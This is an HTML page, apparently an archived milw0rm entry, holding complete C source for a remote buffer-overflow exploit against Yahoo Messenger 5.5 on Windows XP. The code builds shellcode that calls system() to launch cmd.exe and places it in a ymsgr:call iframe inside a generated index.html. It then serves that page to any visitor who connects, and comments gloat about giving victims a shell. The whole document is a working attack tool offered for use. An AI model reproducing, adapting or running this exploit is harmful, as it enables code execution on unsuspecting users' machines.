<html><head><title>Yahoo Messenger 5.5 Remote Exploit (DSR-ducky.c)
</title></head><pre>/* 
*
* ---[ Remote yahoo Messenger V5.5 exploiter on Windows XP ]---
*
* Dtors Security Research (DSR)
* Code by: Rave
*
* The buffer looks like this
*
* |-&lt;-&lt;-&lt;--|
* &lt;Fillup x offset&gt;&lt;JMP 0x3&gt;&lt;EIP&gt;&lt;NOPS&gt;&lt;SHELLCODE&gt;
* ^__________^ 
*
*
*/


#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdio.h&gt; /* These are the usual header files */
#include &lt;winsock2.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#define MAXDATASIZE 555 /* Max number of bytes of data */
#define BACKLOG 200 /* Number of allowed connections */

static int port =80;

/* library entry inside msvcrt.dll to jmp 0xc (EB0C); */
char sraddress[8]=&quot;\x16\xd8\xE8\x77&quot;;

/* This shellcode just executes cmd.exe nothing special here..
* the victim gets a cmd shell on his desktop :) lol ! \
*/

unsigned char shellcode[] =
&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
&quot;\x8b\xec\x55\x8b\xec\x68\x65\x78\x65\x20\x68\x63\x6d\x64\x2e\x8d\x45\xf8\x50\xb8&quot;

&quot;\x44\x80\xbf\x77&quot; // 0x78bf8044 &lt;- adress of system()
&quot;\xff\xd0&quot;; // call system()



static int port;
void Usage(char *programName)
{
printf(&quot;\n\t\t---------------------------------------------------\n&quot;);
printf(&quot;\t\t\t\tDtors Security Research (DSR) \n&quot;);
printf(&quot;\t\t\t\tCode by: Rave\n&quot;);
printf(&quot;\t\t\t\tMail: rave@dtors.net\n&quot;);
printf(&quot;\t\t---------------------------------------------------\n\n&quot;);


/* Modify here to add your usage message when the program is
* called without arguments */
printf(&quot;\t\t---------------------------------------------------\n\n&quot;);
fprintf(stdout,&quot;\t\t-P local webserver server portnumber\n&quot;);
fprintf(stdout,&quot;\t\t-g greatz to:\n\n\n\n\n&quot;);
printf(&quot;\t\t---------------------------------------------------\n\n&quot;);

}

/* returns the index of the first argument that is not an option; i.e.
does not start with a dash or a slash
*/
int HandleOptions(int argc,char *argv[])
{
int i,firstnonoption=0;

for (i=1; i&lt; argc;i++) {
if (argv[i][0] == '/' || argv[i][0] == '-') {
switch (argv[i][1]) {
/* An argument -? means help is requested */
case '?':
Usage(argv[0]);
break;
case 'P':
port=atoi(argv[i+1]);break;
case 'H':
if (!stricmp(argv[i]+1,&quot;help&quot;)) {
Usage(argv[0]);
break;
}
/* If the option -h means anything else
* in your application add code here
* Note: this falls through to the default
* to print an &quot;unknow option&quot; message
*/
/* add your option switches here */
default:
fprintf(stderr,&quot;unknown option %s\n&quot;,argv[i]);
break;
}
}
else {
firstnonoption = i;
break;
}
}
return firstnonoption;
}

int main(int argc,char *argv[])
{
FILE *fptr;
unsigned char buffer[5000];
int offset=320; // &lt;-- the offset off the buffer = 320 x NOP; (At 321 whe begin the instruction pointer change)
int fd,fd2 ,i,numbytes,sin_size; /* files descriptors */

char sd[MAXDATASIZE]; /* sd will store send text */

struct sockaddr_in server; /* server's address information */
struct sockaddr_in client; /* client's address information */
struct hostent *he; /* pointer for the host entry */


WSADATA wsdata;
WSAStartup(0x0101,&amp;wsdata);


if (argc == 1) {
/* If no arguments we call the Usage routine and exit */
Usage(argv[0]);
return 1;
}

HandleOptions(argc,argv);
fprintf(stdout,&quot;Creating index.html: &quot;);
if ((fptr =fopen(&quot;index.html&quot;,&quot;w&quot;))==NULL){
fprintf(stderr,&quot;Failed\n&quot;);
exit(1);
} else {
fprintf(stderr,&quot;Done\n&quot;);
}

// memseting the buffers for preperation
memset(sd,0x00,MAXDATASIZE);
memset(buffer,0x00,offset+32+strlen(shellcode));
memset(buffer,0x90,offset);


// whe place the a jmp ebp+0x3 instuction inside the buffer
// to jump over the eip changing bytes at the en offset
//
// &lt;fillup x offset&gt;jmp 0x3&lt;eip&gt;&lt;NOPS&gt;&lt;shellcode&gt;
// |____________^
buffer[offset-4]=0xeb;
buffer[offset-3]=0x03;

memcpy(buffer+offset,sraddress,4);
memcpy(buffer+offset+4,shellcode,strlen(shellcode));


// here whe make the index.html
// whe open it again if some one connects to the exploiting server
// and send it over to the victim.

fprintf(fptr,&quot;&lt;!DOCTYPE HTML PUBLIC %c-//W3C//DTD HTML 4.0 Transitional//EN%c&gt;&quot;,0x22,0x22);
fprintf(fptr,&quot;&lt;html&gt;&quot;);
fprintf(fptr,&quot;&lt;title&gt;Oohhh my god exploited&lt;/title&gt;\n&quot;);
fprintf(fptr,&quot;&lt;body bgcolor=%cblack%c&gt;&quot;,0x22,0x22);
fprintf(fptr,&quot;&lt;body&gt;&quot;);
fprintf(fptr,&quot;&lt;font color=%c#C0C0C0%c size=%c2%c face=%cverdana, arial, helvetica, sans-serif%c&gt;&quot;,
0x22,0x22,0x22,0x22,0x22,0x22);
fprintf(fptr,&quot;&lt;B&gt;Dtors Security Research (DSR)&lt;/B&gt;\n&quot;);
fprintf(fptr,&quot;&lt;p&gt;Yah000 Messager Version 5.5 exploit....&lt;/p&gt;\n&quot;);
fprintf(fptr,&quot;&lt;pre&gt;&quot;);
fprintf(fptr,&quot;&lt;IFRAME SRC=%cymsgr:call?%s%c&gt;Contach heaven&lt;/html&gt;&lt;/body&gt;\x00\x00\x00&quot;,0x22,buffer,0x22);
fprintf(fptr,&quot;&lt;IFRAME SRC=%chttp://www.boothill-mc.com/images/skull-modsm_01.gif%c&gt;....&lt;/html&gt;
&lt;/body&gt;\x00\x00\x00&quot;,0x22,0x22);

fclose(fptr); // &lt;-- closing index.html again


// Some extra debuging information
fprintf(stdout,&quot;Using port: %d\n&quot;,port);
fprintf(stdout,&quot;\nStarting server http://localhost:%d: &quot;,port);

if ((fd=socket(AF_INET, SOCK_STREAM, 0)) == -1 ){ /* calls socket() */
printf(&quot;socket() error\n&quot;);
exit(1);} else {
fprintf(stderr,&quot;Done\n&quot;);
}


server.sin_family = AF_INET;
server.sin_port = htons(port);
server.sin_addr.s_addr = INADDR_ANY; /* INADDR_ANY puts your IP address automatically */
memset(server.sin_zero,0,8); /* zero the rest of the structure*/


if(bind(fd,(struct sockaddr*)&amp;server,sizeof(struct sockaddr))==-1){
/* calls bind() */
printf(&quot;bind() error\n&quot;);
exit(-1);
}

if(listen(fd,BACKLOG) == -1){ /* calls listen() */
printf(&quot;listen() error\n&quot;);
exit(-1);
}

while(1){
sin_size=sizeof(struct sockaddr_in);
if ((fd2 = accept(fd,(struct sockaddr *)&amp;client,&amp;sin_size))==-1){
/* calls accept() */
printf(&quot;accept() error\n&quot;);
exit(1);
}

if ((he=gethostbyname(inet_ntoa(client.sin_addr)))==NULL){
printf(&quot;gethostbyname() error\n&quot;);
exit(-1);
}

printf(&quot;You got a connection from %s (%s)\n&quot;,
inet_ntoa(client.sin_addr),he-&gt;h_name);
/* prints client's IP */


fprintf(stdout,&quot;\nOpening index.html for remote user: &quot;);
if ((fptr =fopen(&quot;index.html&quot;,&quot;r&quot;))==NULL){
fprintf(stderr,&quot;Failed\n&quot;);
exit(1);
} else {
fprintf(stderr,&quot;Done\n&quot;);
}

fprintf(stdout,&quot;Sending the overflow string... &quot;);


// reading the index.html file and sending its
// contents to the connected victim

while (!feof(fptr)) {
send(fd2,sd,strlen(sd),0);
numbytes=fread(sd,sizeof(char),MAXDATASIZE,fptr);
sd[numbytes * sizeof(char)]='\0';


}


send(fd2,sd,strlen(sd),0);


printf(&quot;\n\n\nExploit Done....\n\n\n&quot;);
printf(&quot;A shell is started @ %s :) lol\n\n\nPress any key to exit the exploit&quot;,inet_ntoa(client.sin_addr),he-&gt;h_name);

gets(sd);
exit(0);
}

return 0;
}


// milw0rm.com [2003-06-23]</pre></html>